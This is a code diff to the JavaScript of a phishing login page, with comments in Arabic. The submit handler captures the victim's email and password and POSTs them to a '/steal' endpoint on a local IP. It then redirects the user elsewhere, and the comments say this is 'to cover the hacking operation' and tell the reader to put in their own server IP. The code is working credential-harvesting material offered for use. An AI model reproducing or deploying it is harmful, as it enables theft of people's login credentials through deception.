@@ -16,19 +16,19 @@
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // قراءة القيم المدخلة
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      // إرسال البيانات لسيرفرك
-      fetch('http://192.168.1.2:3000/steal', {
+      console.log("Sending data:", { email, password });
+
+      fetch('http://192.168.1.2:3000/steal', {  // غير الـ IP لـ IP جهازك اللي شغال عليه السيرفر
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
-      }).catch(console.error);
+      }).catch(err => console.error('Fetch error:', err));
 
-      // يمكن توجه المستخدم بعد ما يكتب بياناته لأي صفحة حقيقية أو صفحة خطأ للتغطية
-      window.location.href = "https://real-login-page.com";
+      // توجيه المستخدم لصفحة وهمية أو حقيقية لتغطية عملية الاختراق
+      window.location.href = "https://www.google.com"; // استبدلها بأي رابط تاني لو حابب
     });
   </script>
 </body>
